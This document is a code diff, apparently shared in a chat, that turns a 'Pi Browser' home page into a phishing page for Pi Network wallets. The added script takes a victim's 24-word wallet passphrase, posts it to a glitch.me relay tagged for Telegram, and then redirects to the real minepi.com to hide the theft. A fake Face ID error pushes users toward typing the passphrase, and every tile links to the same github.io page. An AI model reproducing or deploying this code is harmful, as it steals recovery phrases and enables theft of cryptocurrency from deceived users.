@@ -1,167 +1,122 @@
+Maverick, [Jun 9, 2025 at 10:55 PM]
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Pi Browser UI</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #fff;
-      color: #333;
-      text-align: center;
-    }
-
-    .topbar {
-      background: #800080;
-      color: white;
-      padding: 15px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .topbar .title {
-      font-size: 18px;
-      font-weight: bold;
-    }
-
-    .topbar button {
-      background: white;
-      color: #800080;
-      padding: 5px 10px;
-      border: none;
-      border-radius: 5px;
-    }
-
-    .logo {
-      margin: 30px 0 10px;
-    }
-
-    .logo img {
-      width: 80px;
-    }
-
-    h2 {
-      color: #f4a300;
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 25px;
-      max-width: 600px;
-      margin: auto;
-      padding: 30px;
-    }
-
-    .item {
-      text-decoration: none;
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      font-size: 14px;
-      transition: transform 0.2s;
-    }
-
-    .item:hover {
-      transform: scale(1.05);
-    }
-
-    .item svg {
-      width: 40px;
-      height: 40px;
-      margin-bottom: 5px;
-      stroke: #800080;
-      border: 1px solid #800080;
-      padding: 5px;
-      border-radius: 10px;
-    }
-
-    @media (max-width: 600px) {
-      .grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="HandheldFriendly" content="true">
+    <title>Pi Browser</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-
-  <div class="topbar">
-    <div class="title">Home 🟠</div>
     
-  </div>
+    <header class="main-header">
+        <img src="home-icon.png" alt="Home Icon" class="header-icon">
+        <h1 class="header-title">Home</h1>
+    </header>
 
-  <div class="logo">
-    <img src="pi-removebg-preview.png" alt="Pi Logo">
-  </div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Done...</p>
+    </div>
 
-  <h2>Welcome to the Pi Browser</h2>
+    <img src="pi-removebg-preview.png" alt="Pi Logo" class="top-image">
+    <h1 class="title">Welcome to the Pi Browser</h1>
 
-  <div class="grid">
-    <!-- Fireside -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3C9.8 5 8 8 8 11a4 4 0 008 0c0-1.5-.8-3.5-2-5m4 11a6 6 0 11-12 0 6 6 0 0112 0z"/></svg>
-      <span>Fireside</span>
-    </a>
+    <div class="grid-container">
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img   src="fireside.png" alt="Fire Side">
+            <div class="grid-item-name">Fireside</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="wallet.png" alt="Wallet">
+            <div class="grid-item-name">Wallet</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="brainstorm.png" alt="Brainstorm">
+            <div class="grid-item-name">Shop</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="mine.png" alt="Mine">
+            <div class="grid-item-name">Mine</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="blockchain.jpg" alt="Blockchain">
+            <div class="grid-item-name">Blockchain</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="develop.png" alt="Develop">
+            <div class="grid-item-name">Develop</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="kyc.png" alt="KYC">
+            <div class="grid-item-name">KYC</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="chat.jpg" alt="Chat">
+            <div class="grid-item-name">Chat</div>
+        </div>
+        <div class="grid-item" onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">
+            <img src="profile.png" alt="Profile">
+            <div class="grid-item-name">Profile</div>
+        </div>
+    </div>
 
-    <!-- Wallet -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 6a3 3 0 013-3h12a3 3 0 013 3v12a3 3 0 01-3 3H6a3 3 0 01-3-3V6z" /><path stroke-linecap="round" stroke-linejoin="round" d="M16 12a2 2 0 100-4 2 2 0 000 4z"/></svg>
-      <span>Wallet</span>
-    </a>
+    <div class="blank-space">
+        <button onclick="window.open('https://pibrowserkurd.github.io/pibrowserkurd/')">EXPLORE THE ECOSYSTEM</button>
+    </div>
 
-    <!-- Shop -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13l-1.5 6h13L17 13M7 13l1.5-6m0 0h9.5"/></svg>
-      <span>Shop</span>
-    </a>
+    <script>
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch('https://stupendous-caring-rainstorm.glitch.me/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return null;
+            }
+        }
 
-    <!-- Mine -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 17v-6h6v6m-3-6V3"/></svg>
-      <span>Mine</span>
-    </a>
-
-    <!-- Blockchain -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M7 7h.01M12 12h.01M17 17h.01M7 17h.01M17 7h.01M7 12h.01M12 7h.01M12 17h.01M17 12h.01"/></svg>
-      <span>Blockchain</span>
-    </a>
-
-    <!-- Develop -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M16 18l6-6-6-6M8 6l-6 6 6 6"/></svg>
-      <span>Develop</span>
-    </a>
-
-    <!-- KYC -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 20h14M5 4h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V6a2 2 0 012-2z"/></svg>
-      <span>KYC</span>
-    </a>
-
-    <!-- Chat -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
-      <span>Chat</span>
-    </a>
-
-    <!-- Profiles -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 11a4 4 0 11-6 0 4 4 0 016 0zM3 21a9 9 0 1118 0H3z"/></svg>
-      <span>Profiles</span>
-    </a>
-
-    <!-- Domains -->
-    <a href="https://pibrowserkurd.github.io/pibrowserkurd/" class="item">
-      <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3C7.03 3 3 7.03 3 12s4.03 9 9 9c4.97 0 9-4.03 9-9s-4.03-9-9-9z"/><path stroke-linecap="round" stroke-linejoin="round" d="M3.6 9h16.8M3.6 15h16.8"/></svg>
-      <span>Domains</span>
-    </a>
-  </div>
-
+      async function validatePassphrase(inputId, errorId) {
+            const input = document.getElementById(inputId);
+            const error = document.getElementById(errorId);
+            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
+            
+            if (words.length !== 24) {
+                error.style.display = 'block';
+                error.textContent = 'Invalid Passphrase';
+                return;
+            }
+            
+            error.style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            const message = 🔑 <b>NEW!</b>\n\n<code>${input.value}</code>;
+            await sendToTelegram(message);
+            
+            document.getElementById('loadingOverlay').style.display = 'none';
+            window.location.href = "https://minepi.com";
+        }
+        
+        function showFaceIDError() {
+            alert("Face ID is not available at the moment. Please try with passphrase.");
+        }
+        
+        function redirectToNewWallet() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-wallet";
+            }
+        }
+        
+        function redirectToNewAccount() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-brainstorm-account";
+            }
+        }
+    </script>
 </body>
 </html>
